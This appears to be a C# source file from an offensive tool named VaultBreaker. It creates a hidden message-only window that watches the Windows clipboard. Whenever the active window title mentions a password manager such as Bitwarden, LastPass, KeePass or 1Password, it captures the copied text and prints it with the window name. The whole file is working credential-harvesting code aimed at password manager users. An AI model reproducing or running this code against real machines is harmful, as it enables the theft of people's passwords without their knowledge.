using System;
using System.Windows.Forms;
using System.Text;
using System.Threading;
using VaultBreaker.Helpers;
using System.Linq;

namespace VaultBreaker.Core
{
	public class Monitoring
	{
		//Based on https://github.com/justinbui/SharpClipboard
		public static void Start()
		{
			Application.Run(new ClipboardNotification.NotificationForm());
		}

		public static class Clipboard
		{
			public static string GetText()
			{
				string ReturnValue = string.Empty;
				Thread STAThread = new Thread(
					delegate ()
					{
					// Use a fully qualified name for Clipboard otherwise it
					// will end up calling itself.
					ReturnValue = System.Windows.Forms.Clipboard.GetText();
					});
				STAThread.SetApartmentState(ApartmentState.STA);
				STAThread.Start();
				STAThread.Join();

				return ReturnValue;
			}
		}

		public sealed class ClipboardNotification
		{
			public class NotificationForm : Form
			{
				public string[] supportedManagers = { "password", "bitwarden", "lastpass", "keepass", "1password" };

				public NotificationForm()
				{
					//Turn the child window into a message-only window
					WinAPI.SetParent(Handle, WinAPI.HWND_MESSAGE);
					
					//Add window to the clipboard format listener list
					WinAPI.AddClipboardFormatListener(Handle);
				}

				protected override void WndProc(ref Message m)
				{
	
					//Listen for operating system messages
					if (m.Msg == WinAPI.WM_CLIPBOARDUPDATE)
					{

						//Write to stdout active window
						IntPtr active_window = WinAPI.GetForegroundWindow();
						int length = WinAPI.GetWindowTextLength(active_window);
						StringBuilder sb = new StringBuilder(length + 1);
						WinAPI.GetWindowText(active_window, sb, sb.Capacity);
						if(supportedManagers.Any(sb.ToString().ToLower().Contains)){
							//Copy doesn't work when going from ChromeExtension for lastpass, but does when loading the "Vault Webpage". Should also work for Webpages where you're copying your password.
							Console.WriteLine("Clipboard Retrieved!\r\nWindow Name: {0}\r\nText: {1} ", sb.ToString(), Clipboard.GetText());
						}
					}
					//Called for any unhandled messages
					base.WndProc(ref m);
				}
			}

		}
	}
}
